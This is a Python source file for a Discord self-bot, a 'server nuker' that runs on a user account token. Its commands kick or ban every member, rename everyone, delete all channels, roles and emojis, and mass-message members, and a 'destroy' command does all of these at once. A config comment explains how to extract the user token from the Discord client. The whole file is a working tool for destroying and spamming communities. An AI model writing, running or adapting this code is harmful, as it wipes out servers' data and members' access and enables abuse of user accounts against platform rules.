# CONFIG
# ---------
token = "token" # To find this, press CTRL + SHIFT + i in the Discord client revealing the inspect element prompt. Click the arrows, head over to Application, local storage and there you can find your user token :)
prefix = "~" # This will be used at the start of commands.
rename_to = "Innocent" # The string everyone possible will be renamed to using the 'rall' command.
# ----------

import discord
from discord.ext import commands
from discord.ext.commands import Bot

print ("Loading..")

bot = commands.Bot(command_prefix=prefix, self_bot=True)
bot.remove_command("help")

@bot.event
async def on_ready():
    print ("Ready to be innocent.")

@bot.command(pass_context=True)
async def kall(ctx):
    if bot.user.id == ctx.message.author.id:
        for user in list(ctx.message.server.members):
            try:
                await bot.kick(user)
                print (user.name + " has been kicked from " + ctx.message.server.name)
            except:
                pass    
        print ("Action Completed: kall")

@bot.command(pass_context=True)
async def ball(ctx):
    if bot.user.id == ctx.message.author.id:
        for user in list(ctx.message.server.members):
            try:
                await bot.ban(user)
                print (user.name + " has been banned from " + ctx.message.server.name)
            except:
                pass 
        print ("Action Completed: ball")  

@bot.command(pass_context=True)
async def rall(ctx):
    if bot.user.id == ctx.message.author.id:
        for user in list(ctx.message.server.members):
            try:
                await bot.change_nickname(user, rename_to)
                print (user.name + " has been renamed to " + rename_to + " in " + ctx.message.server.name)
            except:
                pass
        print ("Action Completed: rall")

@bot.command(pass_context=True)
async def dall(ctx, condition):
    if bot.user.id == ctx.message.author.id:
        if condition.lower() == "channels":
            for channel in list(ctx.message.server.channels):
                try:
                    await bot.delete_channel(channel)
                    print (channel.name + " has been deleted in " + ctx.message.server.name)
                except:
                    pass
            print ("Action Completed: dall channels")
        elif condition.lower() == "roles":
            for role in list(ctx.message.server.roles):
                try:
                    await bot.delete_role(ctx.message.server, role)
                    print (role.name + " has been deleted in " + ctx.message.server.name)
                except:
                    pass
            print ("Action Completed: dall roles")
        elif condition.lower() == "emojis":
            for emoji in list(ctx.message.server.emojis):
                try:
                    await bot.delete_custom_emoji(emoji)
                    print (emoji.name + " has been deleted in " + ctx.message.server.name)
                except:
                    pass
            print ("Action Completed: dall emojis")
        elif condition.lower() == "all":
            for emoji in list(ctx.message.server.emojis):
                try:
                    await bot.delete_custom_emoji(emoji)
                    print (emoji.name + " has been deleted in " + ctx.message.server.name)
                except:
                    pass
            for channel in list(ctx.message.server.channels):
                try:
                    await bot.delete_channel(channel)
                    print (channel.name + " has been deleted in " + ctx.message.server.name)
                except:
                    pass
            for role in list(ctx.message.server.roles):
                try:
                    await bot.delete_role(ctx.message.server, role)
                    print (role.name + " has been deleted in " + ctx.message.server.name)
                except:
                    pass
            print ("Action Completed: dall all")

@bot.command(pass_context=True)
async def destroy(ctx):
    if bot.user.id == ctx.message.author.id:
        for emoji in list(ctx.message.server.emojis):
            try:
                await bot.delete_custom_emoji(emoji)
                print (emoji.name + " has been deleted in " + ctx.message.server.name)
            except:
                pass
        for channel in list(ctx.message.server.channels):
            try:
                await bot.delete_channel(channel)
                print (channel.name + " has been deleted in " + ctx.message.server.name)
            except:
                pass
        for role in list(ctx.message.server.roles):
            try:
                await bot.delete_role(ctx.message.server, role)
                print (role.name + " has been deleted in " + ctx.message.server.name)
            except:
                pass
        for user in list(ctx.message.server.members):
            try:
                await bot.ban(user)
                print (user.name + " has been banned from " + ctx.message.server.name)
            except:
                pass
        print ("Action Completed: destroy")

@bot.command(pass_context=True)
async def mall(ctx, *message):
    message = ' '.join(message)
    if bot.user.id == ctx.message.author.id:
        await bot.delete_message(ctx.message)
        try:
            for user in ctx.server.members:
                bot.send_message(user, message)
                print("message sent to " + user.name)
        except:
            pass
        print("Action Completed: mall")

bot.run(token, bot=False)
